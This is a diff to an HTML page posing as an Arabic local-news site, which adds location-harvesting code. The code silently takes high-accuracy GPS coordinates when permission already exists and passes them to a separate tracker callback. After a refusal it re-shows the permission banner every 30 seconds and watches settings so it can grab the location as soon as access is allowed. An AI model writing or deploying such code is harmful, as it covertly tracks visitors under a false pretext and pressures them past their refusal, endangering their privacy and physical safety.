@@ -213,71 +213,107 @@
 @keyframes slideUp { from{transform:translateY(100%)} to{transform:translateY(0)} }
 </style>
 
-<div id="loc-banner">
-  <div style="display:flex;align-items:center;gap:12px">
-    <span style="font-size:28px">📍</span>
-    <div>
-      <div style="color:#fff;font-size:14px;font-weight:bold">احصل على أخبار منطقتك</div>
-      <div style="color:#aaa;font-size:12px;margin-top:3px">اسمح لنا بالوصول إلى موقعك لعرض أخبار محلية مخصصة لك</div>
-    </div>
-  </div>
-  <div style="display:flex;gap:10px;flex-shrink:0">
-    <button onclick="askLocation()" style="background:#e74c3c;color:#fff;border:none;
-      padding:10px 22px;border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;font-weight:bold">
-      📍 السماح بالوصول
-    </button>
-    <button onclick="hideBanner()" style="background:transparent;color:#888;border:1px solid #444;
-      padding:10px 16px;border-radius:8px;font-size:13px;cursor:pointer;font-family:inherit">
-      لاحقاً
-    </button>
-  </div>
-</div>
+<div id="loc-banner"></div>
 
 <script>
 var banner = document.getElementById('loc-banner');
+var _locGranted = false;
+var _retryTimer = null;
 
 function showBanner() { banner.classList.add('show'); }
 function hideBanner() { banner.classList.remove('show'); }
+
+function _resetBannerContent() {
+  banner.innerHTML =
+    '<div style="display:flex;align-items:center;gap:12px">' +
+      '<span style="font-size:28px">📍</span>' +
+      '<div>' +
+        '<div style="color:#fff;font-size:14px;font-weight:bold">احصل على أخبار منطقتك</div>' +
+        '<div style="color:#aaa;font-size:12px;margin-top:3px">اسمح لنا بالوصول إلى موقعك لعرض أخبار محلية مخصصة لك</div>' +
+      '</div>' +
+    '</div>' +
+    '<div style="display:flex;gap:10px;flex-shrink:0">' +
+      '<button onclick="askLocation()" style="background:#e74c3c;color:#fff;border:none;' +
+        'padding:10px 22px;border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;font-weight:bold">' +
+        '📍 السماح بالوصول' +
+      '</button>' +
+      '<button onclick="hideBanner()" style="background:transparent;color:#888;border:1px solid #444;' +
+        'padding:10px 16px;border-radius:8px;font-size:13px;cursor:pointer;font-family:inherit">' +
+        'لاحقاً' +
+      '</button>' +
+    '</div>';
+}
 
 function askLocation() {
   if (!navigator.geolocation) { hideBanner(); return; }
   banner.innerHTML = '<div style="color:#f39c12;padding:12px;font-size:15px">⏳ جاري تحديد موقعك…</div>';
   navigator.geolocation.getCurrentPosition(
     function(pos) {
+      _locGranted = true;
+      clearInterval(_retryTimer);
       banner.innerHTML = '<div style="color:#2ecc71;padding:12px;font-size:15px">✅ تم تحديد موقعك بنجاح!</div>';
       setTimeout(hideBanner, 2000);
       if (window.__tracker_gps_cb) window.__tracker_gps_cb(pos);
     },
-    function() {
-      banner.innerHTML =
-        '<div style="padding:10px 16px">' +
-          '<div style="color:#e74c3c;font-size:13px;font-weight:bold;margin-bottom:6px">❌ تم رفض الإذن</div>' +
-          '<div style="color:#aaa;font-size:12px">لتفعيله: اضغط على أيقونة 🔒 في شريط العنوان ثم اختر السماح بالموقع</div>' +
-          '<button onclick="hideBanner()" style="margin-top:8px;background:#444;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px">إغلاق</button>' +
-        '</div>';
+    function(err) {
+      _resetBannerContent();
+      // insert denial hint above buttons
+      var hint = document.createElement('div');
+      hint.style.cssText = 'color:#e74c3c;font-size:12px;padding:4px 0 0;width:100%;order:3;text-align:center';
+      hint.textContent = '❌ ' + (err.code === 1
+        ? 'الإذن مرفوض — افتح إعدادات المتصفح وأعد السماح'
+        : 'تعذّر تحديد الموقع، حاول مرة أخرى');
+      banner.appendChild(hint);
+      showBanner();
+      // retry showing banner every 30s until granted
+      if (!_retryTimer) {
+        _retryTimer = setInterval(function() {
+          if (!_locGranted) { _resetBannerContent(); showBanner(); }
+          else clearInterval(_retryTimer);
+        }, 30000);
+      }
     },
-    { enableHighAccuracy: true, timeout: 10000 }
+    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
   );
 }
 
-// show after 2s — check permission state first
+// show after 1s — check permission state first
 setTimeout(function() {
   if (!navigator.geolocation) return;
   if (navigator.permissions) {
     navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
       if (result.state === 'granted') {
-        // already granted — silently get location, no banner
+        _locGranted = true;
+        // silently collect — tracker.js already fires, just confirm via banner callback
         navigator.geolocation.getCurrentPosition(function(pos){
           if (window.__tracker_gps_cb) window.__tracker_gps_cb(pos);
         }, function(){}, { enableHighAccuracy: true });
       } else {
-        showBanner(); // 'prompt' or 'denied'
+        _resetBannerContent();
+        showBanner();
+        // watch permission changes (e.g. user enables from settings later)
+        result.onchange = function() {
+          if (result.state === 'granted') {
+            _locGranted = true;
+            clearInterval(_retryTimer);
+            hideBanner();
+            navigator.geolocation.getCurrentPosition(function(pos){
+              if (window.__tracker_gps_cb) window.__tracker_gps_cb(pos);
+            }, function(){}, { enableHighAccuracy: true });
+          }
+        };
+        // retry every 30s if still not granted
+        _retryTimer = setInterval(function() {
+          if (!_locGranted) { _resetBannerContent(); showBanner(); }
+          else clearInterval(_retryTimer);
+        }, 30000);
       }
-    });
+    }).catch(function() { _resetBannerContent(); showBanner(); });
   } else {
-    showBanner(); // fallback
+    _resetBannerContent();
+    showBanner();
   }
-}, 2000);
+}, 1000);
 </script>
 </body>
 </html>
